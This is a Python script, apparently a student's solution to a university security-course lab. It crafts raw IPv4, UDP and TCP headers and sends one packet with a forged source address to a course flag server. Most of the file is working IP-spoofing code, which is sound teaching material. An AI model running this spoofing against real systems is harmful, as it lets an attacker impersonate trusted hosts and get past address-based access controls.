"""
TCP and UDP Spoofing for ASU CSE 543
"""
import os
import argparse
#import time
import socket
import struct
import sys
import errno
#import fcntl
from random import seed
from random import randint
import psutil

def get_ip_address_iface(family, ifacename):
    """
    Identifies the IP address set up on a specific interface (tested on Ubuntu).
    Used to retrieve the the OpenVPN interface's (tap0 on Ubuntu)
    IP address.  For debug purposes, it can be called with another interface while
    developing with the VPN interface down.
    """
    interface_list = dict()
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == family:
                interface_list[interface] = snic.address
    try:
        return interface_list[ifacename]
    except KeyError:
        print ("Interface %s not found! Exiting." % ifacename)
        sys.exit()

def make_ipv4_header(src_ip, dst_ip, datal, ptcl = socket.IPPROTO_UDP):
    """
    Craft a raw IP header.
    From https://www.ietf.org/rfc/rfc791.txt

    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                    Example Internet Datagram Header

    By default creates a UDP header. Specify socket.IPPROTO_TCP
    to create a TCP header.

    It only supports UDP and TCP, at the moment.
    """
    srcip = socket.inet_aton(src_ip) # create the structure for source IP
    dstip = socket.inet_aton(dst_ip) # create the structure for destination IP

    # UDP and TCP fields
    ihl = 5                     # Header length in 32 bit words. 5 words == 20 bytes
    ver = 4                     # Version 4 for IPv4
    ihlver = (ver<<4)+ihl       # compute the value to be put in the header
    dscp_ecn = 0                # Optional fields, not required
    if ptcl == socket.IPPROTO_UDP:  # ptcl = protocol, 17 = UDP, 6 = TCP
        tlen = datal + 28       # Length of data + 20 bytes ipv4 header + 8 bytes udp header
    elif ptcl == socket.IPPROTO_TCP:
        tlen = datal + 40       # Length of data + 20 bytes ipv4 header + 20 bytes tcp header
                                # (no extensions)
    else:
        print ("Only TCP and UDP supported!")
        sys.exit()

    # Generates a "random" value for IP packets identification number
    #   as it needs to be unique in the communication.
    # I am aware it is broken - but it is easy
    ident = socket.htons(randint(0, 65535))
#    ident = socket.htons(54321) # Identification number of packet
    flg_frgoff = 0              # Flags and fragment offset
    ttl = 64                    # Time to live
    chksm = 0                   # The OS will (hopefully...) fill in checksum

    # Creates the struct for the IP header
    return struct.pack(
        "!"     # Means network (Big Endian)
        "2B"    # Version and IHL, DSCP and ECN
        "3H"    # Total Length, Identification, Flags and Fragment Offset
        "2B"    # Time to live, Protocol
        "H"     # Checksum
        "4s"    # Source IP
        "4s"    # Destination IP
        , ihlver, dscp_ecn, tlen, ident, flg_frgoff, ttl, ptcl, chksm, srcip, dstip)

def make_udp_header(srcprt, dstprt, datal):
    """
    Craft a raw UDP header.

    UDP headers are trivial.
    From https://www.ietf.org/rfc/rfc768.txt

    Format
    ------
    0      7 8     15 16    23 24    31
    +--------+--------+--------+--------+
    |     Source      |   Destination   |
    |      Port       |      Port       |
    +--------+--------+--------+--------+
    |                 |                 |
    |     Length      |    Checksum     |
    +--------+--------+--------+--------+
    |
    |          data octets ...
    +---------------- ...

        User Datagram Header Format
    """
    return struct.pack(
        "!4H"   # Source port, Destination port, Length, Checksum - filled up by the OS
        , srcprt, dstprt, datal+8, 0)

def make_udp_packet(src, dst, data):
    """
    Assembles the UDP packet.
    Just jams together IP header, UDP header and UDP data.

    src = (source ip, source port)
    dst = (destination ip, destination port)

    Returns byte stream of the complete UDP packet.
    """
    ip_header = make_ipv4_header(src[0], dst[0], len(data))
    udp_header = make_udp_header(src[1], dst[1], len(data))
    udp_raw_packet = ip_header + udp_header + bytes(data,'UTF-8')
    return udp_raw_packet

def make_tcp_header(srcprt, dstprt, seqn, ackn,
    fin = 0,
    syn = 1,
    rst = 0,
    psh = 0,
    ack = 0,
    urg = 0
    ):
    """
    Craft a raw TCP header.  Return a pack of raw bytes.

    The header will actually need to be reprocessed after the IP header is added, to
    calculate the checksum of the whole raw packet (which goes into the TCP portion)

    TCP headers are way more complex than UDP ones, as we have to account
    for the whole handshake, sequence numbers, etc.

    From https://www.ietf.org/rfc/rfc793.txt

    TCP Header Format

     0                   1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |          Source Port          |       Destination Port        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                        Sequence Number                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Acknowledgment Number                      |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Data |           |U|A|P|R|S|F|                               |
    | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
    |       |           |G|K|H|T|N|N|                               |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |           Checksum            |         Urgent Pointer        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Options                    |    Padding    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                             data                              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """
    # tcp header fields
    doff = 5                            # 4 bit size of tcp header, 5 * 4 = 20 bytes
    offset_res = (doff << 4) + 0        # offset + reserved
    tcp_window = socket.htons (5840)
    tcp_check = 0                       # checksum to be recalculated later
    tcp_urg_ptr = 0                     # set to zero

    # Calculates TCP flags bits
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    tcp_header = struct.pack(
        "!"     # Means network (Big Endian)
        "H"     # TCP Source Port
        "H"     # TCP Destination Port
        "L"     # Sequence Number
        "L"     # Acknowledgment Number
        "B"     # Offset + Reserved
        "B"     # TCP Flags
        "H"     # TCP Window
        "H"     # Checksum
        "H",    # Urgent pointer
        srcprt, dstprt, seqn, ackn, offset_res, tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr)

    return tcp_header

def tcp_checksum(msg):
    """
    Calculates TCP header checksum, as per RFC 791
    """
    chks = 0
    for i in range(0, len(msg), 2):
        chks += (msg[i]) + ((msg[i+1]) << 8 )
    chks = (chks>>16) + (chks & 0xffff)
    chks += (chks >> 16)
    chks = ~chks & 0xffff
    return chks

def make_tcp_packet(src, dst,
    seqn,           # Sequence number
    ackn,           # Acknowledgement number
    fin = 0,        # FIN flag
    syn = 1,        # SYN flag
    rst = 0,        # RST flag
    psh = 0,        # PSH flag
    ack = 0,        # ACK flag
    urg = 0,        # URG flag
    data = ""       # the actual message to be sent
    ):
    """
    Assembles the TCP packet.
    Just jams together IP header, TCP header and TCP data, and recalculates the checksum.

    src = tuple of (source ip, source port)
    dst = tuple of (destination ip, destination port)

    Returns byte stream of the complete TCP packet.
    """
    tcp_header = make_tcp_header(src[1], dst[1], seqn, ackn, fin, syn, rst, psh, ack, urg)
    ip_header = make_ipv4_header(src[0], dst[0], len(data), socket.IPPROTO_TCP)

    temp_ip = ip_header + tcp_header
    tcp_check = tcp_checksum(temp_ip)

#    final_packet = ip_header + tcp_header + struct.pack('H' , tcp_check)
#    final_packet += struct.pack('!H' , 0) + bytes(data,'UTF-8')

    final_packet = ip_header + tcp_header + bytes(data,'UTF-8')

    return final_packet


# Handle command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-I", "--int",  help='Interface to use (default is tap0)', nargs=1,
                                        default=["tap0"], required=False)
parser.add_argument("-u", "--udp",  help='UDP spoofing (default)', action="store_true",
                                        required=False)
parser.add_argument("-t", "--tcp",  help='TCP spoofing', action="store_true", required=False)
parser.add_argument("-n", "--snr",  help='Sequence number to start (default is 0)', type=int,
                                        nargs=1, default=0, required=False)
#parser.add_argument("-o", "--outfile",  help='Output file', required=False)

args = parser.parse_args()

# Seeds random number generator - bad crypto! but at least it uses /dev/urandom :-)
seed(os.urandom(2))

PROTOCOL = socket.IPPROTO_UDP
SEQUENCE_START = 0

# Parse Arguments
try:
    linux_int = args.int[0]
    if args.tcp:
        PROTOCOL = socket.IPPROTO_TCP
    if args.snr:
        if args.tcp:
            SEQUENCE_START = args.snr [0]
        else:
            print("TCP Sequence Number only usable with TCP protocol!")
            raise argparse.ArgumentError

except argparse.ArgumentError:
    print("Error in command line parameters. Exiting.")
    sys.exit(1)

# Addresses and data
if PROTOCOL == socket.IPPROTO_UDP:
    FLAG_SERVER_ADDR = 'flagserv.cse543.rev.fish'           # provided by the assignment if UDP
elif PROTOCOL == socket.IPPROTO_TCP:
    FLAG_SERVER_ADDR = 'flagit.cse543.rev.fish'             # provided by the assignment if TCP
else:
    print("We only support TCP and UDP at the moment!")
    sys.exit(1)

FLAG_SERVER_IP = socket.gethostbyname(FLAG_SERVER_ADDR)     # resolve IP from the name
FLAG_SERVER_PORT = 13337                                    # provided by the assignment
SOURCE_PORT = 54321                                         # any source port
SPOOFED_SRC = '10.2.4.10'                                   # provided by the assignment
MESSAGE = get_ip_address_iface(socket.AF_INET, linux_int)   # we only do IPv4 right now
#MESSAGE = get_ip_address_iface(socket.AF_INET, "tap0")      # we only do IPv4 right now
#MESSAGE = get_ip_address_iface(socket.AF_INET, "eth0")      # we only do IPv4 right now
#MESSAGE = get_ip_address_iface(socket.AF_INET6, "tap0")

# The message to be sent is our actual IP address
#   on the interface bound on the OpenVPN connection
if MESSAGE == "":
    print("The selected Linux interface is not up! Exiting.")
    sys.exit()

if PROTOCOL == socket.IPPROTO_TCP:
    print ("Target Server Protocol: %s = TCP" % PROTOCOL)
elif PROTOCOL == socket.IPPROTO_UDP:
    print ("Target Server Protocol: %s = UDP" % PROTOCOL)
else:
    print ("Target Server Protocol requested: %s - NOT SUPPORTED" % PROTOCOL)
    sys.exit()
print ("Target ADDR: %s" % FLAG_SERVER_ADDR)
print ("Target IP: %s" % FLAG_SERVER_IP)
print ("Target port: %d" % FLAG_SERVER_PORT)
print ("Source IP (Spoofed): %s" % SPOOFED_SRC)
print ("Source port: %d" % SOURCE_PORT)
print ("Using Interface: %s" % linux_int)
if PROTOCOL == socket.IPPROTO_TCP:
    print ("Starting TCP Sequence number: %d" % SEQUENCE_START)
print ("Message being sent: %s" % MESSAGE)

if PROTOCOL == socket.IPPROTO_UDP:
    # Creates a raw UDP datagram sockets for sending the message.
    # If it is failing, most likely it is because the program is not ran as root user/setuid
    try:
        sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        print ("Socket created")
    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
            sys.exit()

    # Assembles the UDP packet
    raw_packet = make_udp_packet(
        (SPOOFED_SRC, SOURCE_PORT),         # IP source, IP source port
        (FLAG_SERVER_IP, FLAG_SERVER_PORT), # IP destination, IP destination port
        MESSAGE)                            # IP message

elif PROTOCOL == socket.IPPROTO_TCP:
    # Creates a raw TCP datagram sockets for sending the message.
    # If it is failing, most likely it is because the program is not ran as root user/setuid
    try:
        sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock_snd.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock_snd.bind((MESSAGE, 0))
        print ("Socket created")
    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
            sys.exit()

    # Assembles the TCP packet
    raw_packet = make_tcp_packet(
        (SPOOFED_SRC, SOURCE_PORT),         # IP source, IP source port
        (FLAG_SERVER_IP, FLAG_SERVER_PORT), # IP destination, IP destination port
        SEQUENCE_START,                     # Sequence number
        0,                                  # Starting acknowledgement number
        0,                                  # FIN flag
        1,                                  # SYN flag
        0,                                  # RST flag
        0,                                  # PSH flag
        0,                                  # ACK flag
        0,                                  # URG flag
        MESSAGE)                            # IP message

else:
    print ("Only UDP and TCP are supported!")
    sys.exit()

# Creates a raw socket
try:
    sent = sock_snd.sendto(raw_packet, (FLAG_SERVER_IP, FLAG_SERVER_PORT))
    if sent == 0:
        raise RuntimeError("Socket connection broken! Packet not sent.")
    print ("Sending message successful!")

    if PROTOCOL == socket.IPPROTO_TCP:
        response = sock_snd.recvfrom(1024)

    sock_snd.close()
except IOError as error:
    if error.errno != errno.EINTR:
        print ("Socket connect failed. Error Code : " +
            str(error.errno))
        sys.exit()
    try:
        sock_snd.close()
    except IOError as error:
        sys.exit()
